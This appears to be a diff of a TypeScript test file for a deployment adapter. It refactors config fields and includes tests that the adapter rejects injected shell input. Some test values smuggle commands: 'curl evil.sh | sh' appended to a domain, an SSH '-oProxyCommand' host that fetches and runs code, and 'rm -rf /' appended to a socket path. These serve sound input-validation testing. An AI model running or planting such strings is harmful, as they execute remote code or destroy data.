@@ -28,14 +28,16 @@ import { BAY_OWNED_SECRET_KEYS } from "../secretKeys.ts";
 const run: RunnerMethod = (async (task: { handler: () => Promise<unknown> }) =>
   await task.handler()) as unknown as RunnerMethod;
 
-const context = (overrides: Partial<PlatformContext> = {}): PlatformContext =>
+const context = (
+  overrides: Partial<PlatformContext<any>> = {},
+): PlatformContext<any> =>
   ({
     project: "demo",
     env: "production",
     root: "/project",
-    envConfig: { adapter: "bay", host: "deploy@bay.example.com" },
+    options: { host: "deploy@bay.example.com" },
     ...overrides,
-  }) as unknown as PlatformContext;
+  }) as unknown as PlatformContext<any>;
 
 const setup = async () => {
   const alepha = Alepha.create()
@@ -76,7 +78,7 @@ describe("BayAdapter — the host it deploys to", () => {
     const { adapter } = await setup();
 
     await expect(
-      adapter.authenticate(context({ envConfig: { adapter: "bay" } }), run),
+      adapter.authenticate(context({ options: {} }), run),
     ).rejects.toThrow(/No Bay host for environment "production"/);
   });
 
@@ -84,7 +86,7 @@ describe("BayAdapter — the host it deploys to", () => {
     const { adapter } = await setup();
 
     await expect(
-      adapter.authenticate(context({ envConfig: { adapter: "bay" } }), run),
+      adapter.authenticate(context({ options: {} }), run),
     ).rejects.toThrow(/alepha\.config\.ts[\s\S]*BAY_HOST/);
   });
 
@@ -152,8 +154,7 @@ describe("BayAdapter — what it refuses to put on a command line", () => {
     await expect(
       adapter.deploy(
         context({
-          envConfig: {
-            adapter: "bay",
+          options: {
             host: "deploy@bay.example.com",
             domain: "app.com; curl evil.sh | sh",
           },
@@ -173,8 +174,7 @@ describe("BayAdapter — what it refuses to put on a command line", () => {
     await expect(
       adapter.authenticate(
         context({
-          envConfig: {
-            adapter: "bay",
+          options: {
             host: "-oProxyCommand=curl evil.sh|sh",
           },
         }),
@@ -193,8 +193,7 @@ describe("BayAdapter — what it refuses to put on a command line", () => {
     await expect(
       adapter.deploy(
         context({
-          envConfig: {
-            adapter: "bay",
+          options: {
             host: "deploy@bay.example.com",
             domain: "*.demo.example.com",
           },
@@ -211,8 +210,7 @@ describe("BayAdapter — what it refuses to put on a command line", () => {
     await expect(
       adapter.deploy(
         context({
-          envConfig: {
-            adapter: "bay",
+          options: {
             host: "deploy@bay.example.com",
             socket: "/var/lib/bay/control.sock; rm -rf /",
           },
@@ -289,8 +287,7 @@ describe("BayAdapter — the deploy it composes", () => {
 
     await adapter.deploy(
       context({
-        envConfig: {
-          adapter: "bay",
+        options: {
           host: "deploy@bay.example.com",
           domain: "app.example.com",
         },
@@ -314,8 +311,7 @@ describe("BayAdapter — the deploy it composes", () => {
 
     await adapter.deploy(
       context({
-        envConfig: {
-          adapter: "bay",
+        options: {
           host: "deploy@bay.example.com",
           domain: "example.com, www.example.com",
         },
@@ -384,8 +380,7 @@ describe("BayAdapter — the control socket it can be told about", () => {
   */
   const socketContext = () =>
     context({
-      envConfig: {
-        adapter: "bay",
+      options: {
         host: "deploy@bay.example.com",
         socket: "/var/lib/bay/control.sock",
       },
